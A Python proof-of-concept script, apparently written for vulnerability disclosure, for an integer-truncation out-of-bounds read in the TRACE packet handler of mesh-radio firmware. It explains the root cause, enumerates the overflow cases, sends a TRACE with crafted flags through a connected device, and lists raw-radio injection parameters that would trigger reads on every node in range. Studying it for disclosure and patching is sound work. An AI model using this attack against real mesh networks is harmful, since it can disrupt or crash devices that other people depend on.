#!/usr/bin/env python3
"""
Bug #11 PoC — TRACE Path Offset Overflow Causes OOB Read
=========================================================
Affected: src/Mesh.cpp — onRecvPacket() TRACE handler (lines 42-64)

Root cause
----------
When handling an incoming TRACE packet, the firmware computes:

    uint8_t path_sz = flags & 0x03;           // attacker-controlled: 0..3
    uint8_t offset = pkt->path_len << path_sz; // truncated to uint8_t!

`pkt->path_len` can be 0-63 (guard at line 43 ensures < MAX_PATH_SIZE=64).
`path_sz` comes from the payload flags byte — attacker-controlled (0-3).

When path_len * (1 << path_sz) > 255, the result overflows uint8_t:

  path_len=32, path_sz=3 → 32 << 3 = 256 → uint8_t → 0
  path_len=40, path_sz=3 → 40 << 3 = 320 → uint8_t → 64
  path_len=63, path_sz=2 → 63 << 2 = 252 → uint8_t → 252 (OK, fits)

The wrapped offset is then used in:

    self_id.isHashMatch(&pkt->payload[i + offset], 1 << path_sz)

where `i = 9` (tag + auth_code + flags header).  If the wrapped offset
is small enough (< len), this accesses `pkt->payload[9 + offset]` with
up to 8 bytes read (1 << path_sz = 8 when path_sz=3).

With the non-wrapped value, the intended access would be beyond the
payload (32*8 = 256 bytes into payload) which should result in the
"reached end of path" branch.  Instead, the truncation causes:
  - Wrong branch taken (else instead of "end of path")
  - OOB read if i + wrapped_offset + hash_size > payload_len (184)
  - Potential forwarding of the corrupt TRACE to the next hop

Exploitation vector
-------------------
TRACE packets are UNAUTHENTICATED — no signature or encryption.
Any node (or raw radio injector) can craft malicious TRACE packets.

Via raw radio injection (SDR / modified firmware):
  1. Set path_len byte to a value causing overflow when shifted
  2. Set flags & 0x03 = 3 (8-byte path hashes)
  3. Provide minimal payload (just 9-byte header)
  4. Every node in range processes this → OOB read on each one

Via the meshcore_py API:
  The path_len at the receiver depends on forwarding hops (starts at 0,
  increments by 1 at each hop).  Getting it to 32+ requires 32+ hops,
  which is impractical for normal operation.  However, the flags byte
  IS directly controllable via send_trace(flags=...).

This script demonstrates the overflow math and, if a device is connected,
sends a TRACE with path_sz=3 to show the flags are controllable.

How to use
----------
1. Analysis only (no device needed):
     python bug11-trace-offset-overflow.py --analyze

2. Send a TRACE with crafted flags (requires device):
     python bug11-trace-offset-overflow.py -p COM3 --send-trace

Replace COM3 with your serial port.
"""

import asyncio
import argparse
import sys

try:
    from meshcore import MeshCore, EventType
except ImportError:
    sys.exit("meshcore package not found – pip install meshcore")


# ---------- protocol constants (must match firmware) ----------
MAX_PATH_SIZE       = 64
MAX_PACKET_PAYLOAD  = 184
TRACE_HEADER_SIZE   = 9     # tag(4) + auth_code(4) + flags(1)


def analyze():
    """Print offset overflow analysis for all dangerous combinations."""
    print("=" * 70)
    print("Bug #11 — TRACE Path Offset Overflow Analysis")
    print("=" * 70)

    print(f"\nTRACE packet payload layout:")
    print(f"  [0..3]   trace_tag      (4 bytes)")
    print(f"  [4..7]   auth_code      (4 bytes)")
    print(f"  [8]      flags          (1 byte: lower 2 bits = path_sz)")
    print(f"  [9..end] path_hashes    (variable: n_hops * (1 << path_sz) bytes)")
    print(f"\n  path_len (from wire): lower 6 bits of path_len byte (0-63)")
    print(f"  Guard: pkt->path_len < MAX_PATH_SIZE ({MAX_PATH_SIZE})")
    print(f"  So path_len range: 0-63")

    print(f"\n--- Vulnerable computation ---")
    print(f"  uint8_t offset = pkt->path_len << path_sz;")
    print(f"  where path_sz = flags & 0x03  (0, 1, 2, or 3)")
    print(f"  Overflow: path_len * (1 << path_sz) > 255 → truncated to uint8_t")

    # Enumerate all overflow cases
    print(f"\n--- Overflow cases (path_len * 2^path_sz > 255) ---")
    print(f"  {'path_len':>8s}  {'path_sz':>7s}  {'true_val':>8s}  {'uint8':>5s}  {'wraps_to':>8s}  {'i+offset':>8s}  {'OOB read':>8s}")
    print(f"  {'─'*8}  {'─'*7}  {'─'*8}  {'─'*5}  {'─'*8}  {'─'*8}  {'─'*8}")

    oob_cases = []
    for path_sz in range(4):
        for path_len in range(64):  # 0..63
            true_val = path_len << path_sz
            wrapped = true_val & 0xFF
            if true_val > 255:
                i = TRACE_HEADER_SIZE  # = 9
                access_start = i + wrapped
                hash_size = 1 << path_sz
                access_end = access_start + hash_size
                oob = max(0, access_end - MAX_PACKET_PAYLOAD)
                oob_cases.append((path_len, path_sz, true_val, wrapped, access_start, oob))
                if path_len <= 35 or path_len >= 61:  # show a subset
                    print(f"  {path_len:>8d}  {path_sz:>7d}  {true_val:>8d}  {wrapped:>5d}  {wrapped:>8d}  {access_start:>8d}  "
                          f"{'YES ' + str(oob) + 'B' if oob > 0 else 'no':>8s}")

    if len(oob_cases) > 10:
        print(f"  ... ({len(oob_cases)} total overflow cases)")

    # Worst case analysis
    worst_oob = max(oob_cases, key=lambda x: x[5])
    print(f"\n--- Worst case OOB read ---")
    print(f"  path_len = {worst_oob[0]}, path_sz = {worst_oob[1]}")
    print(f"  true offset    = {worst_oob[0]} << {worst_oob[1]} = {worst_oob[2]}")
    print(f"  uint8 truncated= {worst_oob[3]}")
    print(f"  access: pkt->payload[{TRACE_HEADER_SIZE} + {worst_oob[3]}] = payload[{worst_oob[4]}]")
    hash_sz = 1 << worst_oob[1]
    print(f"  isHashMatch reads {hash_sz} bytes: payload[{worst_oob[4]}..{worst_oob[4] + hash_sz - 1}]")
    print(f"  payload buffer = {MAX_PACKET_PAYLOAD} bytes")
    print(f"  OOB read = {worst_oob[5]} bytes past buffer end")

    # Specific exploitation scenario
    print(f"\n--- Exploitation scenario (raw radio injection) ---")
    pl, ps = 32, 3
    true_off = pl << ps
    wrapped_off = true_off & 0xFF
    hash_sz = 1 << ps
    payload_len = TRACE_HEADER_SIZE + 2  # minimal: header + 2 bytes
    i = TRACE_HEADER_SIZE
    pkt_len = payload_len

    print(f"  Attacker crafts TRACE packet:")
    print(f"    path_len byte = {pl} (mode 0, count {pl})")
    print(f"    flags byte    = 0x{ps:02x} (path_sz = {ps} → {hash_sz}-byte hashes)")
    print(f"    payload_len   = {payload_len} (just header + 2 filler bytes)")
    print(f"  Firmware computes:")
    print(f"    len    = payload_len - 9 = {payload_len - i}")
    print(f"    offset = {pl} << {ps} = {true_off} → uint8_t → {wrapped_off}")
    print(f"    offset ({wrapped_off}) >= len ({payload_len - i})? "
          f"{'YES → onTraceRecv (safe)' if wrapped_off >= payload_len - i else 'NO → enters else branch'}")

    if wrapped_off < payload_len - i:
        print(f"    isHashMatch(&payload[{i} + {wrapped_off}], {hash_sz})")
        print(f"    reads payload[{i + wrapped_off}..{i + wrapped_off + hash_sz - 1}]")
        if i + wrapped_off + hash_sz > MAX_PACKET_PAYLOAD:
            print(f"    *** OOB: reads {i + wrapped_off + hash_sz - MAX_PACKET_PAYLOAD} bytes past buffer ***")
        else:
            print(f"    Within bounds for this payload_len (but wrong data)")
    else:
        # Try a different combination
        pl2, ps2 = 33, 3
        true_off2 = pl2 << ps2
        wrapped_off2 = true_off2 & 0xFF
        print(f"\n  Alternative: path_len={pl2}, path_sz={ps2}")
        print(f"    offset = {pl2} << {ps2} = {true_off2} → uint8_t → {wrapped_off2}")
        remaining = payload_len - i
        print(f"    offset ({wrapped_off2}) >= len ({remaining})? "
              f"{'YES' if wrapped_off2 >= remaining else 'NO → enters else branch'}")

    # Impact
    print(f"\n--- Impact ---")
    print(f"  • OOB read of up to {max(x[5] for x in oob_cases)} bytes past payload[{MAX_PACKET_PAYLOAD}]")
    print(f"  • TRACE packets are UNAUTHENTICATED — no signature needed")
    print(f"  • Any node or SDR in radio range can trigger this")
    print(f"  • Reads adjacent memory in Packet struct (transport_codes, path[], etc.)")
    print(f"  • On ESP32: may cross flash-mapped boundary → exception → reboot")
    print(f"  • Wrong branch: node may forward corrupted TRACE, amplifying the attack")
    print(f"  • Also: uint8_t 'len' truncation if payload_len > 264 (unlikely)")


async def send_trace_test(port: str, baud: int):
    """Send TRACE packets with controllable flags to demonstrate the attack vector."""
    mc = await MeshCore.create_serial(port, baud, debug=False)
    if mc is None:
        sys.exit("Could not connect to device")

    try:
        # Demonstrate that flags (path_sz) is directly controllable
        # The receiver's path_len starts at 0, so no immediate overflow
        # via this API.  This shows the attack surface.
        print("[*] Sending TRACE with path_sz=3 (8-byte hashes)")
        print("[*] Note: path_len starts at 0 from sender, so offset=0 here.")
        print("[*] A raw radio injection would set path_len=32+ to trigger overflow.")
        print()

        # flags=3 sets path hash size to 8 bytes
        r = await mc.commands.send_trace(auth_code=0xDEADBEEF, flags=3)
        print(f"[*] send_trace result: {r}")

        print()
        print("[*] For a full exploit, use SDR (e.g. LoRa SDR with gnuradio)")
        print("[*] to inject a raw TRACE packet with:")
        print("[*]   header byte: ROUTE_TYPE_DIRECT | (PAYLOAD_TYPE_TRACE << 4)")
        print("[*]   path_len byte: 32  (triggers 32<<3=256→0 overflow)")
        print("[*]   payload: 9 bytes (tag + auth_code + flags=0x03)")
        print("[*] Every node in range will experience OOB read.")

    finally:
        await mc.disconnect()


async def main() -> None:
    ap = argparse.ArgumentParser(description="Bug #11 — TRACE offset overflow PoC")
    ap.add_argument("-p", "--port", default=None, help="Serial port (e.g. COM3)")
    ap.add_argument("-b", "--baud", type=int, default=115200)
    ap.add_argument("--analyze", action="store_true",
                    help="Print overflow analysis (no device needed)")
    ap.add_argument("--send-trace", action="store_true",
                    help="Send TRACE with crafted flags via connected device")
    args = ap.parse_args()

    if args.analyze:
        analyze()
        return

    if args.send_trace:
        if not args.port:
            sys.exit("--port is required for --send-trace")
        await send_trace_test(args.port, args.baud)
        return

    # Default: analysis
    analyze()


if __name__ == "__main__":
    asyncio.run(main())
